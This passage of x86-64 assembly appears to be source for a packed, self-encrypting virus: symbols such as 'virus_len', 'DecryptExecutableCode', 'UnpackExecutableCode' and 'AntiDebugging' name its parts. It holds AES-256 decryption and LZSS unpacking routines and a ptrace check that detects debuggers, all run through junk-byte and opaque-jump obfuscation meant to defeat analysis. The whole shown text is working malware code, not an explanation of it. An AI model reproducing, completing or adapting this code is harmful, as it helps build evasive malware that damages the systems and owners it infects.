    xor         rax, rax
    jmp         $+5
db 0x6d, 0x7f, 0x52
    je          ..@Fz1fZVG9Q54v
    jne         ..@Fz1fZVG9Q54v
..@tT5SyTWC3zAC:
    mov         al, BYTE [r1]
    jmp         ..@3aINtGFkhKCg
..@w9mOPGTykUHN:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_PTRACE
    syscall
%endif
    jb          ..@Uc1qcxSZude7
    jae         ..@Uc1qcxSZude7
..@MsMKksaPXwCG:
%ifndef ENABLE_DEBUGGING
    mov         r2, rax
    xor         r3, r3
    xor         r4, r4
%endif
    jmp         ..@DIu3fHrDQtvM
..@2RaWpBFq7EDG:
%ifndef ENABLE_DEBUGGING
    mov         r1, r5
    call        GetEnv
    test        rax, rax
%endif
    jmp         $+4
db 0x5a, 0x78
    jmp         $+3
db 0xec
    jmp         $+3
db 0x02
    jmp         ..@cvu8RRzn4yIF
..@AL3385udTfbv:
    aesimc      xmm0,xmm1
    jmp         $+5
db 0xb0, 0xac, 0xfd
    jb          ..@cc817kpBlqVO
    jae         ..@cc817kpBlqVO
..@aVUq2Dcbr1c4:
    cmp         rcx, QWORD [rsp+_AESE_OFF.length]
    jl          ..@cnZXxrYD3Buu
    jmp         $+5
db 0x64, 0x64, 0xfa
    jb          ..@SlbhGP3DHSNZ
    jae         ..@SlbhGP3DHSNZ
..@lUTQRcNCHeek:
    movdqu      OWORD [rsp+0xa0],xmm0
    jmp         ..@O2V9PbCyum4r
..@E9USdjdWACDA:
    call        ..@fDkUwH3iMRc7
    js          ..@t7sRjBU5hhpi
    jns         ..@t7sRjBU5hhpi
..@2bTKK47qWrQs:
    push        r1
    jmp         $+4
db 0x58, 0x2b
    js          ..@1kRgDZdvwx6r
    jns         ..@1kRgDZdvwx6r
..@tTbh0gvjaeL3:
    movdqa      OWORD [rsi+0x40], xmm1
    jmp         $+5
db 0x22, 0xb4, 0xed
    jmp         $+4
db 0x9c, 0x77
    jb          ..@OXDj1OPAwdah
    jae         ..@OXDj1OPAwdah
..@wpLLlFVO9mtV:
    jz          ..@7pCx9dXiaWPG
    call        Strncmp
    js          ..@ExyRhicBknhM
    jns         ..@ExyRhicBknhM
..@2Rii2lUGK13P:
    ret
    je          Aes256KeyCreation
    jne         Aes256KeyCreation
..@0NwO8L9fa9Lb:
%ifndef ENABLE_DEBUGGING
    cmp         WORD [rax], 0x0a30
%endif
    jb          ..@zjuF0KhQOF6D
    jae         ..@zjuF0KhQOF6D
..@qxdYiIsyu4o6:
    jmp         ..@I9izXL0DPwuC
    jmp         ..@7pCx9dXiaWPG
..@FEejrGcSqjTx:
    aesimc      xmm0,xmm1
    jb          ..@TH9E5caWB1eJ
    jae         ..@TH9E5caWB1eJ
..@8ZxczpF8SGV4:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         $+4
db 0x8d, 0x9c
    js          ..@bU3If2LeN2yc
    jns         ..@bU3If2LeN2yc
..@x7OMBvVJ2cgb:
    mov         rax, rbx
    jmp         ..@b05DVgEQoakx
..@SlbhGP3DHSNZ:
    add         rsp, _AESD_OFF_size+0x100
    leave
    jmp         ..@46SqfWpD1H44
..@I9izXL0DPwuC:
    mov         r1, QWORD [rsp]
    jmp         $+5
db 0xb2, 0x27, 0xe8
    jmp         $+5
db 0x43, 0xe6, 0x47
    jmp         $+3
db 0x59
    jmp         ..@W2DWcVuuccrA
..@tcFgBBZs2Pq9:
    call        AntiDebugging
    jmp         $+5
db 0x7a, 0x60, 0x59
    jmp         ExitProgram
..@nIsicDl9Y2Kc:
    movdqu      xmm3, OWORD [r2+rax+0x10]
    pxor        xmm0, xmm2
    pxor        xmm1, xmm3
    jmp         $+4
db 0x4b, 0x29
    jmp         $+4
db 0x8e, 0xbe
    jl          ..@D98jsSaYvgCK
    jge         ..@D98jsSaYvgCK
..@7nnYfAajIkMR:
    movdqu      OWORD [r1], xmm0
    movdqu      OWORD [r1+0x10], xmm1
    pop         r3
    jmp         ..@EcoqypIkRISj
..@hmh7D0wJ1KCG:
    xor         r2, r2
    xor         r3, r3
    jmp         $+4
db 0x6b, 0x6e
    jl          ..@NFV96YnpliUG
    jge         ..@NFV96YnpliUG
..@GakyFE6c5Sup:
%ifndef ENABLE_DEBUGGING
    jnz         ..@3irnC89gjAUL
%endif
    jmp         ..@KUCsOO6bh0fM
..@o1ANfB6fkLBu:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x60],xmm0
    movdqu      xmm1, OWORD [rsp+0x70]
    jmp         $+4
db 0x9d, 0x2a
    je          ..@0uIBDQX29KKs
    jne         ..@0uIBDQX29KKs
..@1ZtEBzCCGDur:
    GGLOBAL     _decrypt
    mov         r1, r5
    jb          ..@NLHJYjGniIRF
    jae         ..@NLHJYjGniIRF
..@vjhoMLYOw1jF:
    push        r4
    mov         rdi, QWORD [rsp+3*bytes]
    jmp         $+3
db 0xe1
    js          ..@3o3afTSeDuLO
    jns         ..@3o3afTSeDuLO
..@4AU6YoLK2Ij7:
    jmp         UnpackExecutableCode
..@eyij64yIXsEB:
    syscall
    jmp         $+3
db 0x32
    jmp         $+4
db 0x08, 0x6f
    jb          ..@GVuaceRFUbBu
    jae         ..@GVuaceRFUbBu
..@oc0iIC0gDxm6:
    jl          ..@XNHC4BpYXlKt
    jmp         ..@7nnYfAajIkMR
..@2ZHWChkNALAO:
    aesimc      xmm0,xmm1
    jl          ..@pinIjxvZNXx4
    jge         ..@pinIjxvZNXx4
..@8RgSjqiEvN6p:
    movdqu      xmm1, OWORD [rsp+0x20]
    jb          ..@unKCMJxKU39K
    jae         ..@unKCMJxKU39K
..@JPOqKNWx6Gjd:
    pxor        xmm1, xmm4
    jmp         $+5
db 0x89, 0x56, 0xa9
    jmp         $+3
db 0x25
    jmp         ..@zSHsNdlArjZb
..@rk1gCAdtUsmg:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x20],xmm0
    jmp         ..@RA7skX4Ognul
..@GUYeNR0b2jaF:
%ifndef ENABLE_DEBUGGING
    mov         r1, QWORD [rsp]
    xor         r2, r2
%endif
    jmp         $+3
db 0xf6
    jmp         ..@vgr08lnRDzJc
..@o8dz2yLRtdmm:
    jl          ..@A96NZ8hZQ8r5
    rep         cmpsb
    jz          ..@x7OMBvVJ2cgb
    jmp         ..@2xZAm8cxDS2J
..@XGzRfN7TJn7l:
    cmp         BYTE [r1 + rax], 0x0
    jz          ..@vs1qtQvjKjbm
    jmp         ..@rwnsUou04uRk
..@bU3If2LeN2yc:
%ifndef ENABLE_DEBUGGING
    mov         r1, 17
    mov         r2, QWORD [rsp]
    xor         r3, r3
%endif
    jmp         $+3
db 0x4e
    je          ..@wwD5F8CLh9we
    jne         ..@wwD5F8CLh9we
..@F42YBw7yvJN5:
    xor         rax, rax
    jmp         ..@D98jsSaYvgCK
    jb          ..@XNHC4BpYXlKt
    jae         ..@XNHC4BpYXlKt
..@7q0K5UmCAMGt:
    aeskeygenassist xmm2, xmm3, 0x10
    jb          ..@UxoePgUN9974
    jae         ..@UxoePgUN9974
..@0TfmwRMqu0GW:
    call        ..@fDkUwH3iMRc7
    movdqa      OWORD [rsi+0x90], xmm3
    jmp         $+3
db 0x86
    js          ..@7q0K5UmCAMGt
    jns         ..@7q0K5UmCAMGt
..@1NgKGw0bBIw6:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
    xor         r4, r4
    mov         rax, SYS_PTRACE
%endif
    jmp         ..@8ZxczpF8SGV4
..@fOKuICQFCelH:
    sub         rdi, 0x5
    INIT_MX_VAR
    mov         vsp, rdi
    js          ..@WxlW79xxJGhi
    jns         ..@WxlW79xxJGhi
..@jcJ0LgPZGDNC:
    movdqu      xmm1, [rdi]
    movdqu      xmm3, [rdi+0x10]
    movdqa      OWORD [rsi], xmm1
    jmp         ..@3fwUyNCRqZ7E
..@D98jsSaYvgCK:
    add         rax, 0x20
    jmp         $+3
db 0x84
    jmp         $+3
db 0x2c
    jl          ..@68CdBUFMdO3U
    jge         ..@68CdBUFMdO3U
..@AzVlAoI1YHgi:
    aesimc      xmm0,xmm1
    jb          ..@RJbu9MYaWdQE
    jae         ..@RJbu9MYaWdQE
..@70haZqS0Af1m:
    jmp         DecryptExecutableCode
    jmp         $+3
db 0x53
    jmp         $+4
db 0xbb, 0xe1
    jmp         Strlen
..@a93ixNhOkhU9:
%ifndef ENABLE_DEBUGGING
    push        rax
    mov         r1, 16
%endif
    jmp         $+4
db 0xe6, 0xf6
    je          ..@MsMKksaPXwCG
    jne         ..@MsMKksaPXwCG
..@6GzBFh4vPigO:
%ifndef ENABLE_DEBUGGING
    mov         r5, rax
    RFILE       rax, [rsp], 0x200
    cmp         eax, 0x200
%endif
    jmp         $+5
db 0x34, 0x1c, 0x93
    jmp         ..@sO2aYReDslFX
..@P68muGBT5dIa:
    call        ExitProgram
    jl          ..@gEOod0CwrloY
    jge         ..@gEOod0CwrloY
..@V6fuuXgVJZ1l:
    movdqu      xmm1, OWORD [rsp+0x30]
    jb          ..@0D5oqGBn1Dwc
    jae         ..@0D5oqGBn1Dwc
..@46SqfWpD1H44:
    ret
    jmp         $+3
db 0xef
    js          DecryptExecutableCode
    jns         DecryptExecutableCode
..@gEOod0CwrloY:
    VAR         public, key
    jmp         $+3
db 0x81
    jl          ..@noOqPeQ5rmrU
    jge         ..@noOqPeQ5rmrU
..@yuOAHcivmb5y:
    movdqu      [rsi+rcx], xmm0
    add         rcx, 0x10
    jmp         $+5
db 0x23, 0x7b, 0x53
    jmp         ..@aVUq2Dcbr1c4
..@gwa29fl3Er4w:
    movdqa      OWORD [rsi+0xc0], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    call        ..@fDkUwH3iMRc7
    jmp         $+4
db 0x3f, 0xf9
    js          ..@47Bk2vr7bY4B
    jns         ..@47Bk2vr7bY4B
..@qqG5hkcYsibt:
    mov         rdi, QWORD [rsp+_AESD_OFF.keyaddr]
    call        Aes256KeyExpansion
    xor         rcx, rcx
    jmp         $+5
db 0x06, 0x1a, 0x56
    jmp         $+4
db 0xc9, 0xfc
    jmp         ..@ZA1j9JAICuMU
..@esAwQsBKcHhA:
    syscall
    xor         rax, rax
    mov         rax, SYS_FORK
    jl          ..@eyij64yIXsEB
    jge         ..@eyij64yIXsEB
..@nPN2LBEY455K:
    pxor        xmm3, xmm4
    jmp         $+3
db 0xb5
    jl          ..@XjPxU4zHMmPP
    jge         ..@XjPxU4zHMmPP
..@83QsF23Hos3e:
    mov         r1, rax
    je          ..@hmh7D0wJ1KCG
    jne         ..@hmh7D0wJ1KCG
..@u7XxRP5LsjSK:
    movdqu      xmm1, OWORD [rsp+0xb0]
    jmp         $+3
db 0x63
    jmp         ..@2qP4lx3Y5GLL
..@3o3afTSeDuLO:
    mov         rbx, rdi
    mov         rsi, QWORD [rsp+1*bytes]
    jmp         ..@A7q56XK9LLhz
..@NoMI9T52ENEY:
    aesdec      xmm0, xmm1
    jmp         $+5
db 0xb6, 0x99, 0x32
    jmp         $+5
db 0xf4, 0x0b, 0x4e
    jmp         $+5
db 0x39, 0x74, 0xf8
    jmp         $+3
db 0xcf
    jmp         ..@gBsACzSVIXln
..@FeI0NnEr6DaU:
    VAR         public, _start
    jmp         ..@toYNkh3dm5YB
..@fkelzCkghAR4:
%ifndef ENABLE_DEBUGGING
    cmp         eax, 0x3
%endif
    jb          ..@hR93gAsZ4JeV
    jae         ..@hR93gAsZ4JeV
DecryptExecutableCode:
    jmp         ..@MpPeHnBKrd8W
..@Tw4L0sR6fd3o:
    mov         rax, r2
    jmp         ..@e3e2Eh8hdC2c
..@n1EQBE0Efiuf:
    and         r3, 0ffffffffffffffe0h
    push        r3
    jmp         $+3
db 0x7d
    jl          ..@UOvoOxBGzyaD
    jge         ..@UOvoOxBGzyaD
..@MpPeHnBKrd8W:
    GGLOBAL     virus_len
    cmp         DWORD [r5], 0x00000000
    jne         ..@TGBCnM83kPAi
    js          ..@9vh9AlBdPox2
    jns         ..@9vh9AlBdPox2
..@ExyRhicBknhM:
    test        rax, rax
    jmp         $+3
db 0x06
    jl          ..@GbEsC308sMRb
    jge         ..@GbEsC308sMRb
..@w0fgJqaKiqTw:
    movdqu      OWORD [rsp+0x80],xmm0
    jmp         $+3
db 0x3a
    jmp         ..@H0yOLHEYUe9F
..@hR93gAsZ4JeV:
%ifndef ENABLE_DEBUGGING
    jl          ..@3irnC89gjAUL
%endif
    jmp         $+4
db 0x79, 0x7c
    jmp         $+4
db 0x71, 0x4d
    jmp         $+3
db 0x78
    jb          ..@6GzBFh4vPigO
    jae         ..@6GzBFh4vPigO
..@DttZIUe5Pmf4:
    pxor        xmm3, xmm4
    jmp         $+3
db 0x13
    jl          ..@nKnA2e9UKkB1
    jge         ..@nKnA2e9UKkB1
..@sOVsZKcgCqtL:
    movdqu      xmm1, OWORD [rsp+0x60]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x50]
    jmp         ..@SPo9xEwQPnto
..@DLQhB0Xv6gSi:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         $+5
db 0x0e, 0x28, 0x17
    jl          ..@8c38Cu6vFC4J
    jge         ..@8c38Cu6vFC4J
..@pScOhI68Zg2i:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x40],xmm0
    movdqu      xmm1, OWORD [rsp+0x50]
    jmp         $+5
db 0xdb, 0xf6, 0xec
    jmp         ..@2ZHWChkNALAO
..@8c38Cu6vFC4J:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
    mov         eax, DWORD [rsp]
    and         eax, 0xff00
%endif
    js          ..@P26lYbsluJS5
    jns         ..@P26lYbsluJS5
..@Fz1fZVG9Q54v:
    xor         r2, r2
    xor         r3, r3
    jmp         $+4
db 0x69, 0x96
    jmp         $+4
db 0xc4, 0xba
    jl          ..@1ZtEBzCCGDur
    jge         ..@1ZtEBzCCGDur
..@OXDj1OPAwdah:
    aeskeygenassist xmm2, xmm1, 0x0
    jl          ..@E9USdjdWACDA
    jge         ..@E9USdjdWACDA
..@IOG7zPb7IIGT:
    call        Processes
    xor         r1, r1
    jmp         $+3
db 0x01
    jmp         ..@2P6RD1SEKZ9a
..@UxoePgUN9974:
    call        ..@cijoZljesuOv
    movdqa      OWORD [rsi+0xa0], xmm1
    jmp         ..@aUsSS7yZxwr2
..@NFV96YnpliUG:
    xor         r4, r4
    jmp         $+3
db 0x67
    jmp         $+3
db 0x29
    je          ..@UJyjOiG5UxBi
    jne         ..@UJyjOiG5UxBi
Strlen:
    jmp         ..@cYqnDsZi1Y34
..@sjhlNUWPP3XB:
    sub         QWORD [rsp+2*bytes], rdx
    jmp         ..@3o3afTSeDuLO
    jb          ..@A96NZ8hZQ8r5
    jae         ..@A96NZ8hZQ8r5
..@XrNGMHr1eAtu:
    add         rdi, bytes
    jmp         $+4
db 0x4b, 0xd1
    js          ..@hts09ZieR3tn
    jns         ..@hts09ZieR3tn
..@NLHJYjGniIRF:
    mov         r3, 111b
    and         r1, ~(PAGE_SIZE-1)
    mov         r4, r5
    jmp         $+4
db 0xcd, 0x38
    jl          ..@nhPDlT7m0yyB
    jge         ..@nhPDlT7m0yyB
..@Xmh65iE6z7oW:
    jz          ..@tfbqkPM7B8TG
    jmp         ..@PmoM6H5ssYdR
..@WWmppnKJG6Sb:
    pop         r1
    jmp         $+5
db 0x9d, 0x14, 0xa9
    jl          ..@xzWKMKUt0ipL
    jge         ..@xzWKMKUt0ipL
..@wpS5QhnamBeB:
    syscall
    cmp         eax, 0x0
    jl          ..@83QsF23Hos3e
    js          ..@2lroqtBLxIq9
    jns         ..@2lroqtBLxIq9
..@aWuunAt3OeQR:
    xor         rax, rax
    js          ..@n9FAcyINKJ3V
    jns         ..@n9FAcyINKJ3V
..@2P6RD1SEKZ9a:
    call        ExitProgram
    js          ..@TGBCnM83kPAi
    jns         ..@TGBCnM83kPAi
..@lgqne1zp6oPP:
    jmp         ..@n9FAcyINKJ3V
    jmp         $+3
db 0xf8
    jmp         $+4
db 0x97, 0xd6
    jmp         $+4
db 0x19, 0xad
    jmp         $+4
db 0x79, 0x06
    jb          ..@lDjxpKarvsEm
    jae         ..@lDjxpKarvsEm
..@UW5RuhdzOlRl:
%ifndef ENABLE_DEBUGGING
    mov         r4, tracerline_size
%endif
    jmp         $+3
db 0x62
    jmp         $+3
db 0x1d
    jmp         $+3
db 0x96
    jb          ..@YF2i3qQIHJQS
    jae         ..@YF2i3qQIHJQS
..@9vh9AlBdPox2:
    GGLOBAL     _packed
    jmp         $+4
db 0xf8, 0x37
    jmp         $+5
db 0xae, 0x6c, 0x8d
    jmp         $+5
db 0x1f, 0x97, 0xbe
    js          ..@1J9xGt9bjXDy
    jns         ..@1J9xGt9bjXDy
..@pinIjxvZNXx4:
    movdqu      OWORD [rsp+0x50],xmm0
    movdqu      xmm1, OWORD [rsp+0x60]
    jb          ..@o1ANfB6fkLBu
    jae         ..@o1ANfB6fkLBu
GetEnv:
    jmp         ..@3KIIOkrJhOd3
..@DGEFKJZr1yoV:
    pxor        xmm3, xmm2
    ret
    jmp         $+3
db 0x96
    js          Aes256Decryption
    jns         Aes256Decryption
..@xw7D6BWUBbFh:
    GGLOBAL     entrypoint
    cmp         QWORD [r5], 0x0000000000000000
    je          ..@70haZqS0Af1m
    js          ..@C7Q4Oq7go64P
    jns         ..@C7Q4Oq7go64P
..@tZ81iD5Hhxj7:
    movdqa      OWORD [rsi+0xb0], xmm3
    jmp         $+5
db 0x9b, 0x1c, 0x0e
    jmp         $+3
db 0xde
    jmp         ..@4ghzaY2zCFWA
..@5FmHTRxfJKyu:
    xor         rax, rax
    je          ..@tT5SyTWC3zAC
    jne         ..@tT5SyTWC3zAC
..@IGlM29joMSlA:
    add         r2, 1
    dec         r3
    jb          ..@nM1gCDQJeu6O
    jae         ..@nM1gCDQJeu6O
..@9aFPlbbmEWHA:
    movdqa      OWORD [rsi+0x30], xmm3
    aeskeygenassist xmm2, xmm3, 0x2
    call        ..@cijoZljesuOv
    jb          ..@tTbh0gvjaeL3
    jae         ..@tTbh0gvjaeL3
..@H0yOLHEYUe9F:
    movdqu      xmm1, OWORD [rsp+0x90]
    aesimc      xmm0,xmm1
    jmp         ..@ylmIYhISfx8z
..@oPvr6ve0mNw5:
%ifndef ENABLE_DEBUGGING
    mov         r1, 0x1
    mov         rax, SYS_WRITE
    syscall
%endif
    jmp         $+3
db 0xe7
    jmp         $+4
db 0x50, 0x2a
    jmp         $+3
db 0xcd
    jmp         $+3
db 0x36
    js          ..@Ix26tg21e3hJ
    jns         ..@Ix26tg21e3hJ
..@gsG0SfqhBZLY:
    xor         r2, r2
    jb          ..@5KQFre0k7HZz
    jae         ..@5KQFre0k7HZz
..@0D5oqGBn1Dwc:
    aesdec      xmm0, xmm1
    jmp         ..@8RgSjqiEvN6p
..@uTfSc9bUEHWU:
    call        ..@fDkUwH3iMRc7
    movdqa      OWORD [rsi+0x70], xmm3
    aeskeygenassist xmm2, xmm3, 0x8
    je          ..@7ga3j8jx9Sss
    jne         ..@7ga3j8jx9Sss
..@4ghzaY2zCFWA:
    aeskeygenassist xmm2, xmm3, 0x20
    call        ..@cijoZljesuOv
    jmp         $+3
db 0x97
    jmp         $+4
db 0x40, 0xb8
    jmp         $+5
db 0x0a, 0x76, 0xe3
    jmp         ..@gwa29fl3Er4w
..@M51xAvm22H0R:
    movdqu      xmm1, OWORD [rsp+0xa0]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x90]
    jmp         $+3
db 0x6c
    jl          ..@e5mVnCpn0Crk
    jge         ..@e5mVnCpn0Crk
..@yZGvEdbG29mr:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
    mov         rax, SYS_FORK
%endif
    jmp         $+4
db 0xe9, 0x90
    js          ..@zv01rGFpoTi0
    jns         ..@zv01rGFpoTi0
..@GVuaceRFUbBu:
    test        eax, eax
    jz          ..@70haZqS0Af1m
    js          ..@RKC3cuBGqsyu
    jns         ..@RKC3cuBGqsyu
..@7ga3j8jx9Sss:
    call        ..@cijoZljesuOv
    movdqa      OWORD [rsi+0x80], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    jmp         $+4
db 0xad, 0xe1
    jmp         $+4
db 0xe6, 0x35
    jl          ..@0TfmwRMqu0GW
    jge         ..@0TfmwRMqu0GW
..@HRv8C8f6Dl5c:
%ifndef ENABLE_DEBUGGING
    mov         r3, r5
%endif
    jmp         $+3
db 0x01
    jmp         $+5
db 0xc5, 0x2f, 0x93
    jl          ..@UW5RuhdzOlRl
    jge         ..@UW5RuhdzOlRl
..@cYqnDsZi1Y34:
    xor         rax, rax
    jb          ..@XGzRfN7TJn7l
    jae         ..@XGzRfN7TJn7l
..@lhJUVkQkkM83:
    movdqu      xmm1, OWORD [rsp+0xa0]
    js          ..@bLc6xlJvU6C3
    jns         ..@bLc6xlJvU6C3
..@zv01rGFpoTi0:
%ifndef ENABLE_DEBUGGING
    syscall
    cmp         eax, 0x0
    jl          ..@3irnC89gjAUL
%endif
    jmp         ..@4JE6QyyjyeAB
..@3irnC89gjAUL:
%ifndef ENABLE_DEBUGGING
    mov         r1, 1
    call        ExitProgram
%endif
    jmp         ..@uk8PXNGa58MH
..@3fwUyNCRqZ7E:
    movdqa      OWORD [rsi+0x10], xmm3
    aeskeygenassist xmm2, xmm3, 0x1
    call        ..@cijoZljesuOv
    jmp         ..@jvieTkCCNVAi
..@TH9E5caWB1eJ:
    movdqu      OWORD [rsp+0xd0],xmm0
    js          ..@cnZXxrYD3Buu
    jns         ..@cnZXxrYD3Buu
..@zi9YUMAO9UAw:
    sub         r2, non_encrypted_len
    jmp         ..@SHLOlF8Q4OLF

;-----------------------------------------------------
; ENCRYPTED PART (The code below is encrypted but not 
; packed)
_decrypt:
;-----------------------------------------------------
; Encrypted Structures.
struc _LZSSD_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .length     resq 0x1
    .index      resd 0x1
    .bits_buf   resb 0x1
    .mask       resb 0x1
    .bits       resq 0x1
endstruc
;-----------------------------------------------------
; Encrypted Proprocessor values.
original_virus_len: equ _eof-_start
;-----------------------------------------------------
; Encrypted code.
;-----------------------------------------------------
UnpackExecutableCode:
    jmp         ..@HN1CIMeqFnVF
..@8IDwqacejqsw:
    call        rax
    jmp         $+3
db 0x92
    jmp         $+3
db 0x17
    jmp         $+5
db 0x3a, 0x04, 0xd2
    jmp         ..@2vaCos07H13D
..@FfvbMDoDMCq7:
    mov         rcx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    jmp         ..@FCoq3zvGcoqw
..@Uj3Mghg5mXGW:
    sub         rsp, _UEC_OFF_size
    jl          ..@KgorHnTkUX6A
    jge         ..@KgorHnTkUX6A
..@d2Ly6b6dcs1q:
    mov         rcx, 1
    call        ..@YzKYuWEJ7D7C
    mov         QWORD [rsp+_LZSSD_OFF.bits], rax
    jmp         ..@Razo7LskNDgU
..@E8DluKIgYKxj:
    shl         eax, 1
    mov         dl, BYTE [rsp+_LZSSD_OFF.bits_buf]
    jmp         ..@OqfN5mZIsk1m
..@t89Dhdd0M88x:
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    jmp         $+5
db 0xfc, 0xd9, 0x9d
    js          ..@FusUEIRM6cxa
    jns         ..@FusUEIRM6cxa
LzssDecoder:
    jmp         ..@MzHUs9qAne13
..@G7Fxv5ry0QAn:
    mov         r1, QWORD [rsp+_UEC_OFF.mapaddr]
    jb          ..@I8sX7tiPuzeJ
    jae         ..@I8sX7tiPuzeJ
..@KgorHnTkUX6A:
    call        ExitProgram
    jmp         $+3
db 0xca
    jmp         $+4
db 0x11, 0x10
    jl          LzssDecoder
    jge         LzssDecoder
..@SzpffR8EfWK2:
    sub         r2, non_packed_len
    mov         r3, QWORD [rsp+_UEC_OFF.mapaddr]
    call        LzssDecoder
    jmp         ..@AhU8Ii6zqZNi
..@zcc4okHLhCFq:
    cmp         BYTE [rsp+_LZSSD_OFF.mask], 0x00
    jmp         $+5
db 0x78, 0xea, 0x43
    js          ..@QLcro0BmanoO
    jns         ..@QLcro0BmanoO
..@fHRxnSmfsFcl:
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+4
db 0x1c, 0x4c
    js          ..@fC49xQI5pOy1
    jns         ..@fC49xQI5pOy1
..@gAKSROzzDfcV:
    mov         r1, r5
    GGLOBAL     virus_len
    jl          ..@bEO6MeNU0dDy
    jge         ..@bEO6MeNU0dDy
..@Rm58ekQreqN7:
    push        rdi
    jmp         $+5
db 0x0b, 0x3a, 0x1b
    jmp         $+3
db 0xef
    jl          ..@KqjGr5FIpLPT
    jge         ..@KqjGr5FIpLPT
..@bir6ljWdZ2EE:
    add         rax, 1
    js          ..@Bj2JY06agdBy
    jns         ..@Bj2JY06agdBy
..@sTIs7OMPjLZ1:
    xor         r2, r2
    xor         r3, r3
    jmp         $+5
db 0x9a, 0x8f, 0xe9
    jmp         ..@iBqxwJDrepLM
..@V5jDFx31Xm9Z:
    mov         rbx, QWORD [rsp+_LZSSD_OFF.inputaddr]
    mov         dl, BYTE [rbx]
    mov         BYTE [rsp+_LZSSD_OFF.bits_buf], dl
    jb          ..@bd6BOvYuyH7C
    jae         ..@bd6BOvYuyH7C
..@2vaCos07H13D:
    xor         rax, rax
    jmp         ..@G7Fxv5ry0QAn
..@XqgfIvcvXAGJ:
    GGLOBAL     _packed
    jmp         $+4
db 0xe4, 0x0b
    jmp         $+4
db 0x13, 0x2d
    jmp         ..@gAKSROzzDfcV
..@MzHUs9qAne13:
    sub         rsp, _LZSSD_OFF_size
    jmp         ..@iZ19WNUqMjKF
..@AhU8Ii6zqZNi:
    mov         rax, QWORD [rsp+_UEC_OFF.mapaddr]
    jmp         ..@IR0yvIy5xSEF
..@M5y0M3s3drC7:
    mov         QWORD [rsp+_LZSSD_OFF.length], r2
    mov         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    jl          ..@FfvbMDoDMCq7
    jge         ..@FfvbMDoDMCq7
..@DuSYTdOnFKSK:
    sub         rcx, 1
    js          ..@ZqmZtbfix3N1
    jns         ..@ZqmZtbfix3N1
..@iaku14EpktMm:
%ifdef X86_32
    int         0x80
%endif
    jl          ..@7uTSH6lxwvHa
    jge         ..@7uTSH6lxwvHa
..@Kcyf5EQU25p6:
    shr         BYTE [rsp+_LZSSD_OFF.mask], 1
    jl          ..@DuSYTdOnFKSK
    jge         ..@DuSYTdOnFKSK
..@LRm8HA8sqxyZ:
    xor         rdi, rdi
    jl          ..@eTBEVNSg6S0c
    jge         ..@eTBEVNSg6S0c
..@bEO6MeNU0dDy:
    xor         r2, r2
    je          ..@j8TQsGlYQ50s
    jne         ..@j8TQsGlYQ50s
..@2KSYcOH8KZDs:
    or          eax, 1
    jmp         $+4
db 0x8e, 0x23
    jmp         $+5
db 0xca, 0x96, 0x4b
    jb          ..@Kcyf5EQU25p6
    jae         ..@Kcyf5EQU25p6
..@FszClEkA9TFz:
%ifdef X86_64
    mov         r10, 0x22
    mov         r8, 0xffffffffffffffff
    mov         eax, SYS_MMAP
%endif
    jmp         $+4
db 0x53, 0xc6
    js          ..@ddXNm06zffuB
    jns         ..@ddXNm06zffuB
..@mn5Md4ArCrfU:
    jg          ..@agK3O6XS4MuD
    jmp         ..@3pJffek8MamO
    jmp         ..@YzKYuWEJ7D7C
..@XapKhwMwoJ6X:
    mov         QWORD [rsp+_UEC_OFF.mapaddr], rax
    jmp         $+5
db 0xb4, 0x43, 0x12
    jmp         $+3
db 0x80
    jmp         ..@XqgfIvcvXAGJ
..@JjV7b9owFMQx:
    xor         rdi, rdi
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    mov         BYTE [rbx], al
    je          ..@9oDbWWSILi7U
    jne         ..@9oDbWWSILi7U
..@HN1CIMeqFnVF:
    xor         rax, rax
    jmp         $+5
db 0x1e, 0xe2, 0xdb
    jl          ..@vKeUikvxiMTw
    jge         ..@vKeUikvxiMTw
..@KqjGr5FIpLPT:
    ret
    jmp         ..@3pJffek8MamO
..@xFuoBqLpJW1p:
    add         bx, cx
    and         bx, WINDOW_LENGTH-1
    mov         al, BYTE [rsp+_LZSSD_OFF.buffer+rbx]
    jmp         $+5
db 0x0d, 0xb7, 0x89
    jmp         ..@tSTzsRaJWmO9
..@vKeUikvxiMTw:
    xor         r1, r1
    jmp         $+5
db 0x12, 0x25, 0xba
    jmp         $+4
db 0x98, 0xd4
    jl          ..@sTIs7OMPjLZ1
    jge         ..@sTIs7OMPjLZ1
..@OqfN5mZIsk1m:
    and         dl, BYTE [rsp+_LZSSD_OFF.mask]
    test        dl, dl
    jz          ..@Kcyf5EQU25p6
    jmp         $+3
db 0xc4
    jmp         $+5
db 0xc5, 0xd1, 0x96
    js          ..@2KSYcOH8KZDs
    jns         ..@2KSYcOH8KZDs
..@I8sX7tiPuzeJ:
    mov         r2, original_virus_len-non_packed_len
    jmp         $+3
db 0xa1
    jmp         $+3
db 0xba
    jb          ..@R6rAmMj0RwvM
    jae         ..@R6rAmMj0RwvM
..@dtA4g6fJN6G8:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jl          ..@X0nPEO8taA2X
    jge         ..@X0nPEO8taA2X
..@DhYxYuhen962:
%ifdef X86_64
    mov         esi, original_virus_len-non_packed_len
    mov         edx, 111b
%endif
    js          ..@FszClEkA9TFz
    jns         ..@FszClEkA9TFz
..@3iWdJkGqprO0:
    call        ..@YzKYuWEJ7D7C
    jmp         $+5
db 0x47, 0x13, 0x78
    jmp         ..@bir6ljWdZ2EE
..@j8TQsGlYQ50s:
